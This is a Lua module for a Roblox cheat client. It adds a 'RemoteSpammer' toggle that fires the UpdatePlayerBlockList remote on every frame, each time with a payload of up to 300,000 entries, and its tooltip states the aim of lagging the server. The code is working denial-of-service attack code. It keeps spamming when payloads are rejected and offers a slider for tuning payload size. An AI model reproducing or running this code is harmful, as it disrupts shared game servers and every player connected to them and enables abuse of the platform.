local RemoteSpammer
local Payload
local payload
local payloadSize

-- the size of the payload is what makes each fire expensive, so it is only rebuilt
-- when the slider moves
local function getPayload()
	if not payload or payloadSize ~= Payload.Value then
		payloadSize = Payload.Value
		payload = table.create(payloadSize)
		for index = 1, payloadSize do
			payload[index] = {id = index, v = index * 2}
		end
	end

	return payload
end

local function getRemote()
	local container = game:FindFirstChild('RobloxReplicatedStorage')
	local remote = container and container:FindFirstChild('UpdatePlayerBlockList')
	return remote and cloneref(remote)
end

RemoteSpammer = vape.Categories.World:CreateModule({
	Name = 'RemoteSpammer',
	Function = function(callback)
		if callback then
			notif('RemoteSpammer', 'Spamming the block list remote.', 5)

			repeat
				local remote = getRemote()
				if remote then
					-- a payload this large can be rejected, which must not kill the spam
					pcall(remote.FireServer, remote, getPayload())
				end

				runService.Heartbeat:Wait()
			until not RemoteSpammer.Enabled
		else
			payload = nil -- not worth holding a payload this size while the module is off
		end
	end,
	Tooltip = 'Spams the UpdatePlayerBlockList remote with a huge payload to lag the server.'
})
Payload = RemoteSpammer:CreateSlider({
	Name = 'Payload',
	Min = 1000,
	Max = 300000,
	Default = 150000,
	Tooltip = 'Entries in each payload, bigger is heavier but more likely to be rejected.'
})

-- a saved profile must never start the spam on inject
local remoteSpammerLoad = RemoteSpammer.Load
function RemoteSpammer:Load(data)
	local settings = table.clone(data)
	settings.Enabled = false
	return remoteSpammerLoad(self, settings)
end
